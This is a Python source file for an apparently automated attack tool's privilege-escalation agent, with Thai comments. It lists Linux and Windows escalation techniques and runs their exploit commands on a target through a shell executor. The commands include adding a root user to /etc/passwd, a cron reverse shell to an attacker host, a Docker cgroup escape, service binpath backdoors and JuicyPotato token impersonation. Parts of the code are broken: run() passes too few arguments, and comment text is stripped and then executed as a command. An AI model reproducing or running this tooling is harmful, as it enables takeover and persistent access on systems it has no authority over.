from core.base_agent import BaseAgent
from core.data_models import AgentData, Strategy, AttackPhase
"""
Privilege Escalation Agent
Agent สำหรับเพิ่ม privileges บนระบบที่เข้าถึงได้แล้ว
"""
import asyncio
from typing import Dict, List, Any
from core.logger import log


class PrivilegeEscalationAgent:
    """
    Privilege Escalation Agent
    
    Features:
    - Linux privilege escalation
    - Windows privilege escalation
    - Kernel exploits
    - SUID binaries exploitation
    - Sudo misconfiguration exploitation
    - Weak file permissions exploitation
    """
    
    def __init__(self):
        self.linux_techniques = self._load_linux_techniques()
        self.windows_techniques = self._load_windows_techniques()
    
    async def run(self, target: Dict) -> Dict:
        """
        Main entry point for PrivilegeEscalationAgent
        
        Args:
            target: Dict containing target information and parameters
        
        Returns:
            Dict with execution results
        """
        try:
            result = await self.escalate_privileges(target)
            
            if isinstance(result, dict):
                return result
            else:
                return {
                    'success': True,
                    'result': result
                }
        
        except Exception as e:
            log.error(f"[PrivilegeEscalationAgent] Error: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    

    def _load_linux_techniques(self) -> List[Dict[str, Any]]:
        """โหลด Linux privilege escalation techniques"""
        return [
            {
                "name": "SUID Binaries",
                "description": "Find and exploit SUID binaries",
                "command": "find / -perm -4000 -type f 2>/dev/null",
                "exploit_commands": [
                    "# If find is SUID: find . -exec /bin/sh -p \\; -quit",
                    "# If vim is SUID: vim -c ':!sh'",
                    "# If nmap is SUID: nmap --interactive; !sh"
                ]
            },
            {
                "name": "Sudo Misconfiguration",
                "description": "Check sudo permissions",
                "command": "sudo -l",
                "exploit_commands": [
                    "# If (ALL) NOPASSWD: /bin/bash: sudo /bin/bash",
                    "# If (ALL) NOPASSWD: /usr/bin/vim: sudo vim -c ':!sh'"
                ]
            },
            {
                "name": "Kernel Exploits",
                "description": "Check kernel version for known exploits",
                "command": "uname -a",
                "exploit_commands": [
                    "# DirtyCow (CVE-2016-5195) for kernel < 4.8.3",
                    "# Dirty Pipe (CVE-2022-0847) for kernel 5.8 - 5.16.11"
                ]
            },
            {
                "name": "Writable /etc/passwd",
                "description": "Check if /etc/passwd is writable",
                "command": "ls -la /etc/passwd",
                "exploit_commands": [
                    "echo 'hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd",
                    "su hacker"
                ]
            },
            {
                "name": "Cron Jobs",
                "description": "Check for writable cron jobs",
                "command": "cat /etc/crontab; ls -la /etc/cron.*",
                "exploit_commands": [
                    "echo '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"' >> /etc/crontab"
                ]
            },
            {
                "name": "Docker Escape",
                "description": "Escape from Docker container",
                "command": "cat /proc/1/cgroup | grep docker",
                "exploit_commands": [
                    "# Mount host filesystem",
                    "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x",
                    "echo 1 > /tmp/cgrp/x/notify_on_release",
                    "host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`",
                    "echo \"$host_path/cmd\" > /tmp/cgrp/release_agent"
                ]
            }
        ]
    
    def _load_windows_techniques(self) -> List[Dict[str, Any]]:
        """โหลด Windows privilege escalation techniques"""
        return [
            {
                "name": "Unquoted Service Path",
                "description": "Find services with unquoted paths",
                "command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\\\"\"",
                "exploit_commands": [
                    "# If path is C:\\Program Files\\Some Service\\service.exe",
                    "# Create C:\\Program.exe or C:\\Program Files\\Some.exe"
                ]
            },
            {
                "name": "AlwaysInstallElevated",
                "description": "Check if AlwaysInstallElevated is enabled",
                "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
                "exploit_commands": [
                    "# Create malicious MSI and install",
                    "msiexec /quiet /qn /i malicious.msi"
                ]
            },
            {
                "name": "Weak Service Permissions",
                "description": "Find services with weak permissions",
                "command": "accesschk.exe -uwcqv \"Authenticated Users\" * /accepteula",
                "exploit_commands": [
                    "sc config <service> binpath= \"C:\\backdoor.exe\"",
                    "sc stop <service>",
                    "sc start <service>"
                ]
            },
            {
                "name": "DLL Hijacking",
                "description": "Find DLL hijacking opportunities",
                "command": "dir /s /b *.dll",
                "exploit_commands": [
                    "# Replace legitimate DLL with malicious one",
                    "copy malicious.dll C:\\Program Files\\App\\legitimate.dll"
                ]
            },
            {
                "name": "Token Impersonation",
                "description": "Impersonate SYSTEM token",
                "command": "whoami /priv",
                "exploit_commands": [
                    "# Use tools like Juicy Potato, Rotten Potato",
                    "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t *"
                ]
            }
        ]
    
    async def escalate_privileges(self, target_os: str, shell_executor) -> Dict[str, Any]:
        """
        พยายามเพิ่ม privileges
        
        Args:
            target_os: "linux" หรือ "windows"
            shell_executor: function สำหรับรันคำสั่งบน target
        
        Returns:
            ผลลัพธ์การ privilege escalation
        """
        log.info(f"[PrivEscAgent] Starting privilege escalation on {target_os}")
        
        techniques = self.linux_techniques if target_os == "linux" else self.windows_techniques
        
        results = {
            "target_os": target_os,
            "techniques_tried": [],
            "successful_techniques": [],
            "escalated": False
        }
        
        for technique in techniques:
            log.info(f"[PrivEscAgent] Trying: {technique['name']}")
            
            # Run reconnaissance command
            recon_result = await shell_executor(technique["command"])
            
            technique_result = {
                "name": technique["name"],
                "description": technique["description"],
                "recon_output": recon_result.get("output", ""),
                "success": False
            }
            
            # Check if technique is applicable
            if await self._check_technique_applicable(technique, recon_result):
                log.success(f"[PrivEscAgent] {technique['name']} is applicable!")
                technique_result["applicable"] = True
                technique_result["exploit_commands"] = technique["exploit_commands"]
                
                # Try to exploit for real
                exploit_success = await self._try_exploit_technique(technique, shell_executor)
                
                if exploit_success:
                    technique_result["success"] = True
                    technique_result["exploited"] = True
                    results["successful_techniques"].append(technique_result)
                    results["escalated"] = True
                    
                    # Stop after first successful exploit
                    log.success(f"[PrivEscAgent] Privilege escalation successful via {technique['name']}!")
                    break
                else:
                    technique_result["success"] = False
                    technique_result["exploited"] = False
            else:
                technique_result["applicable"] = False
            
            results["techniques_tried"].append(technique_result)
        
        if results["escalated"]:
            log.success(f"[PrivEscAgent] Privilege escalation successful!")
            log.success(f"[PrivEscAgent] Successful techniques: {len(results['successful_techniques'])}")
        else:
            log.warning(f"[PrivEscAgent] No privilege escalation techniques worked")
        
        return results
    
    async def _check_technique_applicable(self, technique: Dict, recon_result: Dict) -> bool:
        """ตรวจสอบว่า technique ใช้ได้หรือไม่"""
        output = recon_result.get("output", "")
        
        # Check if technique is applicable based on recon output
        if technique["name"] == "SUID Binaries":
            return "/bin/" in output or "/usr/bin/" in output
        elif technique["name"] == "Sudo Misconfiguration":
            return "NOPASSWD" in output or "(ALL)" in output
        elif technique["name"] == "Writable /etc/passwd":
            return "-rw-" in output and "root" in output
        elif technique["name"] == "Unquoted Service Path":
            return "Program Files" in output and "\"" not in output
        elif technique["name"] == "AlwaysInstallElevated":
            return "0x1" in output
        
        # Default: assume not applicable
        return False
    
    async def _try_exploit_technique(self, technique: Dict, shell_executor) -> bool:
        """
        พยายาม exploit technique จริง
        
        Args:
            technique: technique ที่จะ exploit
            shell_executor: function สำหรับรันคำสั่ง
        
        Returns:
            True ถ้า exploit สำเร็จ
        """
        exploit_commands = technique.get("exploit_commands", [])
        
        if not exploit_commands:
            return False
        
        # Try first exploit command
        first_cmd = exploit_commands[0]
        
        # Remove comment prefix if present
        if first_cmd.startswith("# "):
            first_cmd = first_cmd[2:]
        
        # Execute exploit command
        try:
            result = await shell_executor(first_cmd)
            
            # Check if successful
            if result.get("success"):
                log.success(f"[PrivEscAgent] Exploit command executed: {first_cmd[:50]}...")
                return True
            else:
                log.warning(f"[PrivEscAgent] Exploit command failed: {first_cmd[:50]}...")
                return False
        
        except Exception as e:
            log.error(f"[PrivEscAgent] Exploit execution error: {e}")
            return False
    
    async def auto_escalate(self, target_os: str, shell_executor) -> Dict[str, Any]:
        """
        อัตโนมัติ privilege escalation
        
        จะลองทุก technique จนกว่าจะสำเร็จ
        """
        log.info(f"[PrivEscAgent] Starting auto privilege escalation")
        
        result = await self.escalate_privileges(target_os, shell_executor)
        
        if result["escalated"]:
            # Verify we have root/admin
            verify_cmd = "whoami" if target_os == "linux" else "whoami"
            verify_result = await shell_executor(verify_cmd)
            
            is_root = "root" in verify_result.get("output", "").lower() or \
                     "administrator" in verify_result.get("output", "").lower() or \
                     "system" in verify_result.get("output", "").lower()
            
            result["verified_root"] = is_root
            
            if is_root:
                log.success(f"[PrivEscAgent] ROOT/ADMIN access confirmed!")
            else:
                log.warning(f"[PrivEscAgent] Escalation claimed but not verified")
        
        return result

